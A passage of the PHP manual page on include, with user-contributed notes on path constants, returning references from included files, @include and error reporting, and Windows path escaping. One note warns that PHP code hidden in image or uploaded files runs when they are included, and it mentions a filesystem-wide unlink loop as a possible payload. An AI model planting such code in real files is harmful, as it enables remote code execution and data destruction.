<br />&nbsp; &nbsp;&nbsp; * &lt;code&gt;<br />&nbsp; &nbsp;&nbsp; * $directories = array(<br />&nbsp; &nbsp;&nbsp; *&nbsp; &nbsp;&nbsp; 'Application',<br />&nbsp; &nbsp;&nbsp; *&nbsp; &nbsp;&nbsp; 'Settings',<br />&nbsp; &nbsp;&nbsp; *&nbsp; &nbsp;&nbsp; 'DocRoot'<br />&nbsp; &nbsp;&nbsp; * );<br />&nbsp; &nbsp;&nbsp; * &lt;/code&gt;<br />&nbsp; &nbsp;&nbsp; */<br />&nbsp; &nbsp; </span><span class="default">$directories </span><span class="keyword">= array(<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="string">'Includes'<br />&nbsp; &nbsp; </span><span class="keyword">);<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; if (</span><span class="default">defined</span><span class="keyword">(</span><span class="string">'__DIR__'</span><span class="keyword">)) {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">__DIR__</span><span class="keyword">;<br />&nbsp; &nbsp; }<br />&nbsp; &nbsp; else {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">);<br />&nbsp; &nbsp; }<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />&nbsp; &nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">$currentDirectory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">;<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; foreach (</span><span class="default">$directories </span><span class="keyword">as </span><span class="default">$directory</span><span class="keyword">) {<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">DIRECTORY_SEPARATOR </span><span class="keyword">. </span><span class="default">$directory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="default">$currentDirectory<br />&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="keyword">);<br />&nbsp; &nbsp; }<br />&nbsp; &nbsp; <br />&nbsp; &nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />}<br /><br /></span><span class="default">define</span><span class="keyword">(</span><span class="string">'SERVER_DOC_ROOT'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />Using this file, you can include files using the defined SERVER_DOC_ROOT constant and each file included that way will be included from the correct location and no errors/warnings will be thrown.<br /><br />Example:<br /><span class="default">&lt;?php<br /></span><span class="keyword">include </span><span class="default">SERVER_DOC_ROOT </span><span class="keyword">. </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br /></span><span class="default">?&gt;</span>
</span>
</code></div>
  </div>
 </div>
  <div class="note" id="85862">  <div class="votes">
    <div id="Vu85862">
    <a href="/manual/vote-note.php?id=85862&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd85862">
    <a href="/manual/vote-note.php?id=85862&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V85862" title="40% like this...">
    -4
    </div>
  </div>
  <a href="#85862" class="name">
  <strong class="user"><em>example at user dot com</em></strong></a><a class="genanchor" href="#85862"> &para;</a><div class="date" title="2008-09-21 09:33"><strong>9 years ago</strong></div>
  <div class="text" id="Hcom85862">
<div class="phpcode"><code><span class="html">
Just about any file type can be 'included' or 'required'.&nbsp; By sending appropriate headers, like in the below example, the client would normally see the output in their browser as an image or other intended mime type.<br /><br />You can also embed text in the output, like in the example below.&nbsp; But an image is still an image to the client's machine.&nbsp; The client must open the downloaded file as plain/text to see what you embedded.<br /><br /><span class="default">&lt;?php <br /><br />header</span><span class="keyword">(</span><span class="string">'Content-type: image/jpeg'</span><span class="keyword">);<br /></span><span class="default">header</span><span class="keyword">(</span><span class="string">'Content-Disposition: inline;'</span><span class="keyword">);<br /><br />include </span><span class="string">'/some_image.jpg'</span><span class="keyword">;<br />echo </span><span class="string">'This file was provided by example@user.com.'</span><span class="keyword">;<br /><br /></span><span class="default">?&gt;<br /></span><br />Which brings us to a major security issue.&nbsp; Scripts can be hidden within images or files using this method.&nbsp; For example, instead echoing "<span class="default">&lt;?php phpinfo</span><span class="keyword">(); </span><span class="default">?&gt;</span>", a foreach/unlink loop through the entire filesystem, or some other method of disabling security on your machine.<br /><br />'Including' any file made this way will execute those scripts.&nbsp; NEVER 'include' anything that you found on the web or that users upload or can alter in any way.&nbsp; Instead, use something a little safer to display the found file, like "echo file_get_contents('/some_image.jpg');"</span>
</code></div>
  </div>
 </div>
  <div class="note" id="117011">  <div class="votes">
    <div id="Vu117011">
    <a href="/manual/vote-note.php?id=117011&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd117011">
    <a href="/manual/vote-note.php?id=117011&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V117011" title="35% like this...">
    -5
    </div>
  </div>
  <a href="#117011" class="name">
  <strong class="user"><em>Jero Minh</em></strong></a><a class="genanchor" href="#117011"> &para;</a><div class="date" title="2015-04-01 10:55"><strong>2 years ago</strong></div>
  <div class="text" id="Hcom117011">
<div class="phpcode"><code><span class="html">
Notice that using @include (instead of include without @) will set the local value of error_reporting to 0 inside the included script.<br /><br />Consider the following:<br /><span class="default">&lt;?php<br />&nbsp; &nbsp; ini_set</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">, </span><span class="default">E_ALL</span><span class="keyword">);<br /><br />&nbsp; &nbsp; echo </span><span class="string">"Own value before: "</span><span class="keyword">;<br />&nbsp; &nbsp; echo </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">);<br />&nbsp; &nbsp; echo </span><span class="string">"\r\n"</span><span class="keyword">;<br /><br />&nbsp; &nbsp; echo </span><span class="string">"include foo.php: "</span><span class="keyword">;<br />&nbsp; &nbsp; include(</span><span class="string">'foo.php'</span><span class="keyword">);<br /><br />&nbsp; &nbsp; echo </span><span class="string">"@include foo.php: "</span><span class="keyword">;<br />&nbsp; &nbsp; @include(</span><span class="string">'foo.php'</span><span class="keyword">);<br /><br />&nbsp; &nbsp; echo </span><span class="string">"Own value now: " </span><span class="keyword">. </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />foo.php<br /><span class="default">&lt;?php<br />&nbsp; &nbsp; </span><span class="keyword">echo </span><span class="default">ini_get</span><span class="keyword">(</span><span class="string">'error_reporting'</span><span class="keyword">) . </span><span class="string">"\r\n"</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span><br />Output:<br />&nbsp; &nbsp; Own value before: 32767<br />&nbsp; &nbsp; include foo.php: 32767<br />&nbsp; &nbsp; @include foo.php: 0<br />&nbsp; &nbsp; Own value now: 32767</span>
</code></div>
  </div>
 </div>
  <div class="note" id="38128">  <div class="votes">
    <div id="Vu38128">
    <a href="/manual/vote-note.php?id=38128&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd38128">
    <a href="/manual/vote-note.php?id=38128&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V38128" title="36% like this...">
    -3
    </div>
  </div>
  <a href="#38128" class="name">
  <strong class="user"><em>james at gogo dot co dot nz</em></strong></a><a class="genanchor" href="#38128"> &para;</a><div class="date" title="2003-12-09 10:03"><strong>14 years ago</strong></div>
  <div class="text" id="Hcom38128">
<div class="phpcode"><code><span class="html">
While you can return a value from an included file, and receive the value as you would expect, you do not seem to be able to return a reference in any way (except in array, references are always preserved in arrays).<br /><br />For example, we have two files, file 1.php contains...<br /><span class="default">&lt;?php<br />&nbsp; </span><span class="keyword">function &amp;</span><span class="default">x</span><span class="keyword">(&amp;</span><span class="default">$y</span><span class="keyword">)<br />&nbsp; {<br />&nbsp; &nbsp; return include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">'/2.php'</span><span class="keyword">);<br />&nbsp; }<br /><br />&nbsp; </span><span class="default">$z </span><span class="keyword">= </span><span class="string">"FOO\n"</span><span class="keyword">;<br />&nbsp; </span><span class="default">$z2 </span><span class="keyword">= &amp;</span><span class="default">x</span><span class="keyword">(</span><span class="default">$z</span><span class="keyword">);<br /><br />&nbsp; echo </span><span class="default">$z2</span><span class="keyword">;<br />&nbsp; </span><span class="default">$z&nbsp; </span><span class="keyword">= </span><span class="string">"NOO\n"</span><span class="keyword">;<br />&nbsp; <br />&nbsp; echo </span><span class="default">$z2</span><span class="keyword">;<br /></span><span class="default">?&gt;<br /></span><br />and file 2.php contains...<br /><span class="default">&lt;?php&nbsp; </span><span class="keyword">return </span><span class="default">$y</span><span class="keyword">; </span><span class="default">?&gt;<br /></span><br />calling 1.php will produce<br /><br />FOO<br />FOO<br /><br />i.e the reference passed to x() is broken on it's way out of the include()<br /><br />Neither can you do something like <span class="default">&lt;?php $foo </span><span class="keyword">=&amp; include(....); </span><span class="default">?&gt;</span> as that's a parse error (include is not a real function, so can't take a reference in that case).&nbsp; And you also can't do <span class="default">&lt;?php </span><span class="keyword">return &amp;</span><span class="default">$foo ?&gt;</span> in the included file (parse error again, nothing to assign the reference too).<br /><br />The only solutions are to set a variable with the reference which the including code can then return itself, or return an array with the reference inside.<br /><br />---<br />James Sleeman<br /><a href="http://www.gogo.co.nz/" rel="nofollow" target="_blank">http://www.gogo.co.nz/</a></span>
</code></div>
  </div>
 </div>
  <div class="note" id="115360">  <div class="votes">
    <div id="Vu115360">
    <a href="/manual/vote-note.php?id=115360&amp;page=function.include&amp;vote=up" title="Vote up!" class="usernotes-voteu">up</a>
    </div>
    <div id="Vd115360">
    <a href="/manual/vote-note.php?id=115360&amp;page=function.include&amp;vote=down" title="Vote down!" class="usernotes-voted">down</a>
    </div>
    <div class="tally" id="V115360" title="26% like this...">
    -9
    </div>
  </div>
  <a href="#115360" class="name">
  <strong class="user"><em>abanarn at gmail dot com</em></strong></a><a class="genanchor" href="#115360"> &para;</a><div class="date" title="2014-07-11 02:56"><strong>3 years ago</strong></div>
  <div class="text" id="Hcom115360">
<div class="phpcode"><code><span class="html">
To Windows coders, if you are upgrading from 5.3 to 5.4 or even 5.5; if you have have coded a path in your require or include you will have to be careful. Your code might not be backward compatible. To be more specific; the code escape for ESC, which is "\e" was introduced in php 5.4.4 + but if you use 5.4.3 you should be fine. For instance:<br /><br />Test script:<br />-------------<br /><span class="default">&lt;?php<br /></span><span class="keyword">require(</span><span class="string">"C:\element\scripts\include.php"</span><span class="keyword">);<br /></span><span class="default">?&gt;<br /></span><br />In php 5.3.* to php 5.4.3<br />----------------------------<br />If you use require("C:\element\scripts\include.php")&nbsp; it will work fine.<br /><br />If php 5.4.4 + It will break.<br />------------------------------<br />Warning: require(C:←lement\scripts\include.php): failed to open stream: In<br />valid argument in C:\element\scripts\include.php on line 20<br /><br />Fatal error: require(): Failed opening required 'C:←lement\scripts\include.php<br /><br />Solution:<br />-----------<br />Theoretically, you should be always using "\\" instead of "\" when you write php in windows machine OR use "/" like in Linux and you should fine since "\" is an escape character in most programming languages.<br />If you are not using absolute paths ; stream functions is your best friend like stream_resolve_include_path() , but you need to include the path you are resolving in you php.ini (include_path variable).<br /><br />I hope this makes sense and I hope it will someone sometime down the road.<br />cheers,</span>
</code></div>
  </div>
 </div></div>

 <div class="foot"><a href="/manual/add-note.php?sect=function.include&amp;redirect=http://php.net/manual/en/function.include.php"><img src='/images/notes-add@2x.png' alt='add a note' width='12' height='12'> <small>add a note</small></a></div>
</section>    </section><!-- layout-content -->
        <aside class='layout-menu'>
    
        <ul class='parent-menu-list'>
                                    <li>
                <a href="language.control-structures.php">Control Structures</a>
    
                                    <ul class='child-menu-list'>
    
                          
                        <li class="">
                            <a href="control-structures.intro.php" title="Introduction">Introduction</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.if.php" title="if">if</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.else.php" title="else">else</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.elseif.php" title="elseif/else if">elseif/else if</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.alternative-syntax.php" title="Alternative syntax for control structures">Alternative syntax for control structures</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.while.php" title="while">while</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.do.while.php" title="do-&#8203;while">do-&#8203;while</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.for.php" title="for">for</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.foreach.php" title="foreach">foreach</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.break.php" title="break">break</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.continue.php" title="continue">continue</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.switch.php" title="switch">switch</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.declare.php" title="declare">declare</a>
                        </li>
                          
                        <li class="">
                            <a href="function.return.php" title="return">return</a>
                        </li>
                          
                        <li class="">
                            <a href="function.require.php" title="require">require</a>
                        </li>
                          
                        <li class="current">
                            <a href="function.include.php" title="include">include</a>
                        </li>
                          
                        <li class="">
                            <a href="function.require-once.php" title="require_&#8203;once">require_&#8203;once</a>
                        </li>
                          
                        <li class="">
                            <a href="function.include-once.php" title="include_&#8203;once">include_&#8203;once</a>
                        </li>
                          
                        <li class="">
                            <a href="control-structures.goto.php" title="goto">goto</a>
                        </li>
                            
                    </ul>
                    
            </li>
                        
                    </ul>
    </aside>


  </div><!-- layout -->
         
  <footer>
    <div class="container footer-content">
      <div class="row-fluid">
      <ul class="footmenu">
        <li><a href="/copyright.php">Copyright &copy; 2001-2017 The PHP Group</a></li>
        <li><a href="/my.php">My PHP.net</a></li>
        <li><a href="/contact.php">Contact</a></li>
        <li><a href="/sites.php">Other PHP.net sites</a></li>
        <li><a href="/mirrors.php">Mirror sites</a></li>
        <li><a href="/privacy.php">Privacy policy</a></li>
      </ul>
      </div>
    </div>
  </footer>

    
 <!-- External and third party libraries. -->
 <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/ext/modernizr.js"></script>
<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/ext/hogan-2.0.0.min.js"></script>
<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/ext/typeahead.min.js"></script>
<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/ext/mousetrap.min.js"></script>
<script type="text/javascript" src="http://php.net/cached.php?t=1421837618&amp;f=/js/search.js"></script>
<script type="text/javascript" src="http://php.net/cached.php?t=1500560403&amp;f=/js/common.js"></script>

<a id="toTop" href="javascript:;"><span id="toTopHover"></span><img width="40" height="40" alt="To Top" src="/images/to-top@2x.png"></a>

</body>
</html>

